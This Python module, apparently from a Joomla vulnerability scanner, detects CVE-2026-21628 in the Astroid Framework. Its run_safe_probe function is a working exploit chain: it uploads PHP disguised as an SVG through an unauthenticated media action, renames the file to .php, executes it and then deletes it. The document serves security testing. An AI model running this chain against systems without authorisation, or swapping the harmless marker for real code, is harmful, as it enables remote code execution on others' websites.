from __future__ import annotations

import json
import re
import secrets
import urllib.parse
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-21628"
NAME = "Astroid Framework unauthenticated file upload to RCE"
COMPONENT = "Astroid Template Framework for Joomla"
AFFECTED_RULE = "Astroid Framework 2.0.0 through 3.3.10; fixed in 3.3.11"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe"]

LOWER = "2.0.0"
UPPER = "3.3.10"


def _classify(version: str | None) -> str:
    parsed = parse_version_safe(version)
    lower = parse_version_safe(LOWER)
    upper = parse_version_safe(UPPER)
    if parsed is None or lower is None or upper is None:
        return "INCONCLUSIVE"
    if parsed < lower:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed <= upper else "PATCHED"


def _finding(
    status: str,
    confidence: str,
    detail: str,
    action: str = "Upgrade Astroid Framework to 3.3.11 or newer.",
    **kwargs: Any,
) -> Finding:
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
        **kwargs,
    )


def _admin_endpoint(base: str, action: str) -> str:
    query = urllib.parse.urlencode(
        {
            "option": "com_ajax",
            "astroid": "media",
            "action": action,
            "format": "json",
        }
    )
    return f"{base}/administrator/index.php?{query}"


def _ajax_headers(base: str) -> dict[str, str]:
    return {
        "Referer": f"{base}/administrator/",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
    }


def _json(response: dict[str, Any]) -> dict[str, Any]:
    try:
        payload = json.loads(str(response.get("body", "") or "{}"))
    except (json.JSONDecodeError, TypeError):
        return {}
    return payload if isinstance(payload, dict) else {}


def _token(client: HttpClient, base: str, timeout: int) -> tuple[str | None, str | None]:
    for path in ("/administrator/", "/index.php?option=com_users&view=login"):
        response = client.get(f"{base}{path}", timeout=timeout)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        token = extract_csrf_from_html(str(response.get("body", "")))
        if token:
            return token, f"{base}{path}"
    return None, None


def _response_excerpt(response: dict[str, Any]) -> str:
    body = re.sub(r"\s+", " ", str(response.get("body", ""))).strip()
    return body[:300]


def _cleanup(
    client: HttpClient,
    base: str,
    token: str,
    name: str,
    timeout: int,
) -> bool:
    response = client.post(
        _admin_endpoint(base, "remove"),
        data={token: "1", "dir": "images", "name": name, "type": "file"},
        headers=_ajax_headers(base),
        timeout=timeout,
    )
    payload = _json(response)
    if payload.get("status") != "success":
        return False
    check = client.get(f"{base}/images/{urllib.parse.quote(name)}", timeout=timeout)
    body = str(check.get("body", ""))
    return check.get("status") in {403, 404, 410} or "PROOFCMS_" not in body


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    token, token_source = _token(client, base, timeout)
    if not token:
        return _finding(
            "NOT_CONFIRMED",
            "LOW",
            "The admin login page exposed no CSRF token; the unauthenticated media preflight could not start.",
            exploit_ran=True,
            evidence={"token_accepted": False, "component_present": False},
        )

    nonce = secrets.token_hex(6)
    marker = f"PROOFCMS_{nonce}"
    svg_name = f"proofcms-{nonce}.svg"
    php_name = f"proofcms-{nonce}.php"
    payload = f'<?php echo "{marker}"; ?>'.encode()

    upload = client.post_multipart(
        _admin_endpoint(base, "upload"),
        fields={token: "1", "media": "images", "dir": "images"},
        files={"file": (svg_name, payload, "image/svg+xml")},
        headers=_ajax_headers(base),
        timeout=max(timeout, 30),
    )
    if is_transport_error(upload):
        return _finding(
            "ERROR",
            "LOW",
            f"The media upload failed in transit ({transport_error_detail(upload)}).",
            exploit_ran=True,
            evidence={"token_accepted": True, "token_source": token_source},
        )
    upload_json = _json(upload)
    raw_data = upload_json.get("data")
    upload_data: dict[str, Any] = raw_data if isinstance(raw_data, dict) else {}
    if upload_json.get("status") != "success" or not upload_data.get("filename"):
        excerpt = _response_excerpt(upload)
        return _finding(
            "NOT_CONFIRMED",
            "MEDIUM",
            (
                f"The media upload was not accepted (HTTP {upload.get('status', 0)}). "
                f"Response: {excerpt or 'empty'}. A 403/'not authorized' response is the "
                "fixed 3.3.11 behavior."
            ),
            exploit_ran=True,
            proof_url=_admin_endpoint(base, "upload"),
            evidence={
                "token_accepted": True,
                "token_source": token_source,
                "upload_status": upload.get("status"),
                "upload_response": excerpt,
            },
        )

    stored_svg = str(upload_data["filename"])
    rename = client.post(
        _admin_endpoint(base, "rename"),
        data={
            token: "1",
            "dir": "images",
            "name": stored_svg,
            "new_name": php_name,
            "type": "file",
        },
        headers=_ajax_headers(base),
        timeout=max(timeout, 30),
    )
    rename_json = _json(rename)
    if rename_json.get("status") != "success":
        cleaned = _cleanup(client, base, token, stored_svg, timeout)
        return _finding(
            "NOT_CONFIRMED",
            "MEDIUM",
            (
                f"The upload succeeded but the rename was rejected (HTTP {rename.get('status', 0)}). "
                f"Response: {_response_excerpt(rename) or 'empty'}."
            ),
            exploit_ran=True,
            proof_url=_admin_endpoint(base, "rename"),
            uploaded_filename=None if cleaned else stored_svg,
            cleanup_attempted=True,
            cleanup_verified=cleaned,
            evidence={
                "token_accepted": True,
                "upload_status": upload.get("status"),
                "rename_status": rename.get("status"),
                "cleanup_verified": cleaned,
            },
        )

    proof_url = f"{base}/images/{urllib.parse.quote(php_name)}"
    proof = client.get(proof_url, timeout=timeout)
    proof_body = str(proof.get("body", ""))
    executed = proof.get("status") == 200 and marker in proof_body
    cleaned = _cleanup(client, base, token, php_name, timeout)

    evidence = {
        "token_accepted": True,
        "token_source": token_source,
        "upload_status": upload.get("status"),
        "rename_status": rename.get("status"),
        "proof_status": proof.get("status"),
        "marker_found": executed,
        "cleanup_attempted": True,
        "cleanup_verified": cleaned,
    }
    if executed:
        return _finding(
            "VULNERABLE",
            "CONFIRMED",
            (
                "A unique PHP marker was uploaded as an SVG, renamed to .php through the "
                "unauthenticated Astroid media action, and executed from /images/. "
                + ("The artifact was removed with the media remove action." if cleaned else "Cleanup could not be verified.")
            ),
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=None if cleaned else php_name,
            cleanup_attempted=True,
            cleanup_verified=cleaned,
            evidence=evidence,
        )

    return _finding(
        "NOT_CONFIRMED",
        "MEDIUM",
        (
            "The upload and rename succeeded, but the PHP marker was not executed at "
            f"{proof_url} (HTTP {proof.get('status', 0)}). The server may not execute PHP "
            "from images/."
        ),
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=None if cleaned else php_name,
        cleanup_attempted=True,
        cleanup_verified=cleaned,
        evidence=evidence,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del joomla_version, kwargs
    info = (plugins or {}).get("astroid", {})
    version = info.get("version")
    if not info.get("found"):
        return _finding(
            "NOT_DETECTED",
            "MEDIUM",
            "The Astroid Framework library manifest was not detected.",
            action="Verify /administrator/manifests/libraries/astroid.xml manually if the framework is installed.",
        )

    state = _classify(version)
    if state == "LIKELY_VULNERABLE":
        passive = _finding(
            "LIKELY_VULNERABLE",
            "HIGH",
            f"Detected Astroid Framework {version}, which is in the affected range. The media upload/rename actions are reachable without an administrator session.",
            component_version=version,
        )
    elif state == "PATCHED":
        passive = _finding(
            "PATCHED",
            "HIGH",
            f"Detected Astroid Framework {version}, which includes the 3.3.11 administrator authorization check.",
            component_version=version,
            action="Keep Astroid Framework updated.",
        )
    elif state == "NOT_AFFECTED":
        passive = _finding(
            "NOT_AFFECTED",
            "HIGH",
            f"Detected Astroid Framework {version}, which predates the published affected range.",
            component_version=version,
            action="No remediation is required for this CVE.",
        )
    else:
        passive = _finding(
            "INCONCLUSIVE",
            "MEDIUM",
            "The Astroid Framework was detected, but its version could not be parsed.",
            component_version=version,
        )

    if not run_exploit_check:
        return passive
    if exploit_mode != "safe":
        passive.detail += " This module supports only the self-cleaning PHP-marker proof."
        return passive
    if state in {"PATCHED", "NOT_AFFECTED"}:
        passive.detail += " Safe proof skipped because the detected framework is not in the affected range."
        return passive
    result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = version
    return result


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict | None = None,
    aggressive_command: str | None = None,
) -> dict:
    del target_url, timeout, proxy, aggressive_args, aggressive_command
    return {
        "removed": [],
        "remaining": [],
        "manual": [],
        "detail": "The safe probe removes its own PHP/SVG artifacts through the media remove action; verify images/ if cleanup failed.",
    }


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["4.x", "5.x", "6.x"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "required_detectors": ["astroid"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-21628",
            "https://github.com/templaza/astroid-framework/releases/tag/v3.3.11",
            "https://astroidframe.work",
        ],
    }
